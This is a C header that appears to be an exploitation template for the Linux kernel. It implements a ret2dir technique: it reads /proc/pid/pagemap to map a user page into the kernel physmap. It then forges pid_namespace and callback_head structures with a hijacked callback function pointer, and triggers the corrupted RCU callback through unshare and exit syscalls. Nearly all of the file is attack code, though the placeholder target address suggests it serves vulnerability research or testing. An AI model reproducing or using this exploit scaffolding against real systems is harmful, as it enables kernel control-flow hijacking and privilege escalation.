#ifndef _PID_NAMESPACE_TMPL_H_
#define _PID_NAMESPACE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define RCU_OBJ

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct pid_namespace {
    char hole1[0x20];
	void* callback_next;
    char hole2[0xa8];
};

struct callback_head {
	void* callback_next;
	void* callback_func;
};

struct pid_namespace fake_pid_namespace;
struct callback_head fake_callback_head;

unsigned overwrite_start = 0x20;
unsigned overwrite_end = 0x28;

void* victim_obj = (void*)&fake_pid_namespace;

int fd[64];
uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_pid_namespace, 0x00, sizeof(struct pid_namespace));
		fake_pid_namespace.callback_next= (void*)kaddr;
		fake_callback_head.callback_next = 0;
		fake_callback_head.callback_func = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_callback_head, sizeof(struct callback_head));
    }
	return;
err:
	close(fd);
	exit(-1);
}

void do_alloc_victim() {
	syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
	syscall(__NR_unshare, 0x20000200);
	return ;
}

void do_hijack() {
 	syscall(__NR_exit, 0x0);
	return ;
}

#endif
